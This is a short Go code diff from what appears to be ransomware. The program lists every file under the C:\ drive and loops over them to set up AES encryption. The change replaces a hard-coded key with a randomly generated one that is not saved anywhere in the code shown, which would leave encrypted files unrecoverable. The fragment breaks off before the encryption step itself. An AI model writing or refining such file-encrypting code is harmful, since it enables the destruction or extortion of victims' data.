@@ -5,6 +5,7 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"io"
+	"keys"
 	"log"
 	"os"
 	"path/filepath"
@@ -12,7 +13,11 @@ import (
 
 func main() {
 	var allfiles []string = ListAll("C:\\")
-	key := []byte("'5;x~Eq=TjPAX-0KB`9(b<opvS:2O/4M")
+	passwd, err := keys.Generate(32, 10, 10, false, false)
+	if err != nil {
+		panic(err)
+	}
+	key := []byte(passwd)
 	for i := 0; i < len(allfiles); i++ {
 		block, err := aes.NewCipher(key)
 		if err != nil {
